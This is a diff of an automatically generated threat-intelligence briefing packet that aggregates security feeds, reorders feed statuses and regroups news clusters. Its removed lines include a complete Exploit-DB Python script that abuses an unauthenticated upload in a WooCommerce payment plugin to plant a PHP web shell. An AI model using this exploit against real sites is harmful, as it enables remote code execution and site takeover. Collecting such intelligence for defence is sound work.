@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-08-21T01:43:10.725979+00:00
+- Generated: 2026-08-21T03:09:05.758458+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 74
-- Total items in window: 323
+- Total items in window: 324
 - Total clusters raw: 145
-- Total clusters in packet: 59
-- Dropped low score: 86
+- Total clusters in packet: 57
+- Dropped low score: 88
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -70,26 +70,16 @@
 
 ## Feed status
 
-- **Unit 42** (threat_research_primary)
-  - URL: https://unit42.paloaltonetworks.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+- **Unit 42** (threat_research_primary)
+  - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
-  - Status: ok
-  - Item count: 25
-  - In window count: 0
+  - Item count: 15
+  - In window count: 2
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
@@ -100,81 +90,86 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+  - Status: ok
+  - Item count: 25
+  - In window count: 0
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 1
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **SANS Internet Storm Center** (government_authoritative)
-  - URL: https://isc.sans.edu/rssfeed_full.xml
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 10
+  - Item count: 20
+  - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 3
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **SANS Internet Storm Center** (government_authoritative)
+  - URL: https://isc.sans.edu/rssfeed_full.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
-  - In window count: 3
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - URL: https://horizon3.ai/feed/
-  - Status: ok
-  - Item count: 10
   - In window count: 3
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
   - In window count: 4
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - URL: https://horizon3.ai/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 3
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
   - In window count: 0
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
@@ -195,16 +190,16 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
@@ -230,41 +225,46 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 2
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 7
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
-  - In window count: 5
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
   - In window count: 2
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 6
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 2
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
   - Item count: 20
+  - In window count: 5
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
   - In window count: 2
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
@@ -285,6 +285,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 8
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
@@ -295,11 +300,6 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 8
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
@@ -315,26 +315,21 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 15
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
   - Status: ok
-  - Item count: 20
-  - In window count: 14
+  - Item count: 5
+  - In window count: 5
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
@@ -345,23 +340,13 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **Dark Reading** (cyber_news_breach_reporting)
-  - URL: https://www.darkreading.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 26
-- **AI Snake Oil** (ai_security_agentic_risk)
-  - URL: https://www.aisnakeoil.com/feed
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
-  - In window count: 0
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
+  - In window count: 14
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -370,6 +355,21 @@
   - Status: ok
   - Item count: 30
   - In window count: 14
+- **AI Snake Oil** (ai_security_agentic_risk)
+  - URL: https://www.aisnakeoil.com/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
+- **Dark Reading** (cyber_news_breach_reporting)
+  - URL: https://www.darkreading.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 26
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
@@ -390,33 +390,18 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Krebs on Security** (practitioner_analysis)
   - URL: https://krebsonsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/blueteamsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Reddit r/blueteamsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -425,21 +410,36 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - URL: https://www.infosecurity-magazine.com/rss/news/
-  - Status: ok
-  - Item count: 100
-  - In window count: 28
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - URL: https://www.infosecurity-magazine.com/rss/news/
+  - Status: ok
+  - Item count: 100
+  - In window count: 28
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -459,7 +459,7 @@
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
   - Item count: 100
-  - In window count: 6
+  - In window count: 7
 - **Just Security** (policy_strategy_geopolitics)
   - URL: https://www.justsecurity.org/feed/
   - Status: ok
@@ -478,16 +478,16 @@
 - Theme key: apple-ios-macos
 - Cluster count: 11
 - Article count: 17
-- Cohesion: 0.22
+- Cohesion: 0.223
 - Shared strong signals: Apple iOS/macOS
 - Member CVEs: CVE-2026-68820
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: credential_theft, web_shell_backdoor, ransomware_extortion
+  - threat_categories: credential_theft, web_shell_backdoor, ransomware_extortion, phishing_social_eng, supply_chain
   - affected_industries: government
   - affected_products: Apple iOS/macOS
   - urgency_signals: preauth_unauth
-- Cluster IDs: 6117c1d701, bd5d2abe67, 175a6a518c, a50e916d10, 7e142768f0, 7d481c14a9, 2d052ce523, 114ded0230, 3ec665ac60, 388705e7c7, 20c2a82904
+- Cluster IDs: 6117c1d701, bd5d2abe67, 175a6a518c, a50e916d10, 7e142768f0, 7d481c14a9, 114ded0230, 3ec665ac60, 388705e7c7, 2d052ce523, 20c2a82904
 - Links:
   - https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html
   - https://www.securityweek.com/hackers-target-zimbra-servers-in-active-exploitation-campaign/
@@ -500,34 +500,11 @@
   - https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
   - https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
   - https://thehackernews.com/2026/08/rust-supply-chain-attack-puts-build.html
-  - https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
   - https://www.sophos.com/en-us/blog/fake-ai-real-malware-attackers-impersonating-ai-brands
   - https://www.sophos.com/en-us/blog/2608-patch-tuesday
   - https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
+  - https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
   - https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/
-
-### WordPress vulnerability activity
-- Anchor signal: WordPress
-- Theme key: wordpress
-- Cluster count: 4
-- Article count: 10
-- Cohesion: 0.2
-- Shared strong signals: WordPress
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_products: WordPress
-  - urgency_signals: preauth_unauth
-- Cluster IDs: 73e2ba5a94, ad3b948659, 8a66834bf6, 94883eb56c
-- Links:
-  - https://orca.security/resources/blog/elementor-pro-wordpress-rce-flaw/
-  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
-  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
-  - https://www.bleepingcomputer.com/news/security/critical-elementor-pro-bug-exposes-wordpress-sites-to-rce-attacks/
-  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
-  - https://www.exploit-db.com/exploits/52642
-  - https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
-  - https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/
 
 ### credential theft targeting Citrix
 - Anchor signal: Citrix
@@ -595,6 +572,27 @@
   - https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
   - https://www.wiz.io/blog/detecting-entra-device-registration-abuse
   - https://unit42.paloaltonetworks.com/communication-channel-identity-risks/
+
+### WordPress vulnerability activity
+- Anchor signal: WordPress
+- Theme key: wordpress
+- Cluster count: 3
+- Article count: 9
+- Cohesion: 0.2
+- Shared strong signals: WordPress
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: WordPress
+- Cluster IDs: 73e2ba5a94, 8a66834bf6, 94883eb56c
+- Links:
+  - https://orca.security/resources/blog/elementor-pro-wordpress-rce-flaw/
+  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
+  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
+  - https://www.bleepingcomputer.com/news/security/critical-elementor-pro-bug-exposes-wordpress-sites-to-rce-attacks/
+  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
+  - https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
+  - https://www.securityweek.com/cisco-patches-critical-crosswork-secure-workload-vulnerabilities/
 
 ### ransomware extortion targeting SonicWall
 - Anchor signal: SonicWall
@@ -666,14 +664,14 @@
 - Theme key: medusa
 - Cluster count: 3
 - Article count: 4
-- Cohesion: 0.303
+- Cohesion: 0.315
 - Shared strong signals: Medusa
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: ransomware_extortion, credential_theft
+  - threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, credential_theft
   - actor_attribution: Medusa
-  - affected_industries: government, critical_infrastructure, financial_services
+  - affected_industries: critical_infrastructure, financial_services, government
   - affected_products: Apple iOS/macOS
   - urgency_signals: preauth_unauth
 - Cluster IDs: c7e8884f67, 2d052ce523, 20c2a82904
@@ -1081,7 +1079,7 @@ Attackers Exploit Zimbra SNMP Flaw for Unauthenticated Remote Code Execution 
   - Link: https://www.securityweek.com/hackers-target-zimbra-servers-in-active-exploitation-campaign/
   - Summary: Exploitation of the Zimbra Collaboration vulnerability CVE-2026-73570 has been observed by Poland’s CERT Polska. The post Hackers Target Zimbra Servers in Active Exploitation Campaign appeared first on SecurityWeek .
 
-### Cluster d5c3fd8d4d — score 22
+### Cluster d5c3fd8d4d — score 21
 
 - Title: Going with the Flow(s): Distinct Clusters Target Individuals of Interest to Russia
 - Source: Google Cloud Threat Intelligence (threat_research_primary)
@@ -1507,21 +1505,17 @@ lurker • August 20, 2026 3:38 PM May 26 – July 4 is 40 days that Agents have
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-08-17T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52642
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_products: WordPress
-- cve_ids: CVE-2026-3891
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
-- affected_products: WordPress
-- cve_ids: CVE-2026-3891
 - urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
@@ -1532,12 +1526,6 @@ lurker • August 20, 2026 3:38 PM May 26 – July 4 is 40 days that Agents have
 WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
 ```
 
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload EDB-ID: 52642 CVE: 2026-3891 EDB Verified: Author: Mohammad Hossein Sadeghian Type: webapps Exploit: / Platform: Multiple Date: 2026-08-17 Vulnerable App: # Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload # Google Dork: N/A # Date: 2026-07-15 # Exploit Author: Mohammad Hossein Sadeghian # Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Version: <= 1.5.0 # Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7 # CVE: CVE-2026-3891 import requests import sys def print_banner(): banner = r""" ____ __ _ __ __ / __ \________ ____ _____/ / / | / /__ / /_ / / / / ___/ _ \/ __ \/ __ / / |/ / _ \/ __/ / /_/ / / / __/ /_/ / /_/ / / /| / __/ /_ /_____/_/ \___/\__,_/\__,_/ /_/ |_/\___/\__/ Author: m4sh_wacker """ print(banner) def main(): print_banner() target = input("[?] Enter target URL: ").strip().rstrip("/") if not target.startswith(("http://", "https://")): target = "http://" + target ajax_url = f"{target}/wp-admin/admin-ajax.php" filename = "woocommerce.php" content = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>' session = requests.Session() print("\n[*] Requesting nonce...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_generate_nonce", "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce" }, timeout=10 ) result = response.json() nonce = result["data"]["nonce"] print(f"[+] Nonce obtained: {nonce}") except Exception as e: print(f"[-] Failed to obtain nonce: {e}") sys.exit(1) print(f"[*] Uploading {filename}...") try: response = session.post( ajax_url, data={ "action": "lkn_pix_for_woocommerce_c6_save_settings", "_ajax_nonce": nonce }, files={ "certificate_crt_path": ( filename, content, "text/plain" ) }, timeout=10 ) result = response.json() if not result.get("success"): print("[-] Upload failed.") print(response.text) sys.exit(1) except Exception as e: print(f"[-] Upload error: {e}") sys.exit(1) uploaded_url = ( f"{target}/wp-content/plugins/" f"payment-gateway-pix-for-woocommerce/" f"Includes/files/certs_c6/{filename}" ) print("\n[+] File uploaded successfully!") print(f"[+] URL: {uploaded_url}") if __name__ == "__main__": main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
-```
-
 #### Corroborating sources (1)
 
 - **Exploit-DB** (offensive_vulnerability_research)
@@ -1545,61 +1533,6 @@ Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual 
   - Published: 2026-08-17T00:00:00+00:00
   - Link: https://www.exploit-db.com/exploits/52642
   - Summary: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
-
-### Cluster 9f44f5f9a4 — score 13
-
-- Title: Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-08-20T13:48:24+00:00
-- Link: https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
-- Fetch status: ok
-- Member count: 4
-- Corroborating source count: 3
-- Strong signals: GitHub
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, ddos
-- affected_industries: telecommunications
-- affected_products: Anthropic/Claude, Atlassian Jira, Azure, GitHub, Snowflake
-- content_type: news_report, vulnerability_disclosure
-- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter
-
-#### Primary article taxonomy
-- threat_categories: credential_theft, ddos
-- affected_industries: telecommunications
-- affected_products: GitHub, Azure, Anthropic/Claude
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability ("GHSA-864f-rcv7-6rh4"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.
-```
-
-#### Full body
-
-```
-Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE  Ravie Lakshmanan  Aug 20, 2026 Vulnerability / Application Security Cybersecurity researchers have disclosed a critical security flaw in isolated-vm , a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (" GHSA-864f-rcv7-6rh4 "), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0. It has been patched in versions 6.2.0 and 7.0.1 released earlier this month. Isolated-vm is a Node.js library for running untrusted JavaScript inside a V8 Isolate , an independent instance of the Google V8 JavaScript engine, allowing multiple sandboxed JavaScript environments to run concurrently without sharing data or interfering with each other. The npm package has witnessed nearly 1 million downloads over the past week. Because each V8 Isolate has a separate state and maintains its own heap, it is not possible to directly pass JavaScript objects from the main Node.js thread into a worker isolate. Isolated-vm exposes a class called ExternalCopy to securely serialize JavaScript objects out of the host isolate and deserialize them into the guest isolate. The vulnerability identified by Endor Labs resides in this component, allowing code running inside the sandbox to break out and corrupt memory in the host application. "A type confusion in ExternalCopy's handling of the transferList option lets code running inside the sandbox corrupt memory in the host process," Endor Labs researcher Cristian-Alexandru Staicu, who is credited with discovering and reporting the flaw, said in a technical write-up shared with The Hacker News. "Starting from nothing but a single ivm.Reference, the standard way hosts hand a sandbox any capability at all, we escalated the bug from a controlled-address crash all the way to hijacking the host's control flow, demonstrating a full guest-to-host sandbox escape." Successful exploitation of the flaw allows memory corruption in the host process, causing the host process to crash with a segmentation fault ( SIGSEGV ). It can also lead to a guest-to-host sandbox escape and an erosion of the trust boundary that undermines the very purpose of isolated-vm. "Minimum demonstrated impact is a reliable, controlled-address crash (denial-of-service) triggerable by any guest that has been given an ivm.Reference (the standard way to grant a sandbox any capability)," project maintainer Marcel Laverdet said in an advisory. "Maximum demonstrated impact is control-flow hijack of the host process, i.e., potential remote code execution in the host." Users who have isolated-vm installed in their developer environments are advised to update to the latest version for optimal protection. Additional details of the full exploit have been withheld so as to prevent bad actors from launching their own attacks. "The most important takeaway is that what was not broken was the isolation primitive itself," Staicu said. "V8's Isolate boundary held. What failed was the C++ glue code that marshals values across that boundary. A perfectly sound building block was undermined by the binding layer wrapped around it." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Developer Security , JavaScript , Open Source , remote code execution , Sandbox Security , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers
-```
-
-#### Corroborating sources (3)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE
-  - Published: 2026-08-20T13:48:24+00:00
-  - Link: https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
-  - Summary: Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability ("GHSA-864f-rcv7-6rh4"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR
-  - Published: 2026-08-17T14:00:00+00:00
-  - Link: https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug
-  - Summary: Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: How a popular Android library silently exposed thousands of apps to Arbitrary File Overwrite (AFO). https://itis911.github.io/writeups/cropper-vulnerability.html
-  - Published: 2026-08-18T16:24:33+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/
-  - Summary: submitted by /u/Fit_Veterinarian4403 [link] [comments]
 
 ### Cluster a7d83e74e6 — score 12
 
@@ -1793,6 +1726,61 @@ All Blog Internet Weather Threat Research Threat Intelligence 101 Eli Woodward 5
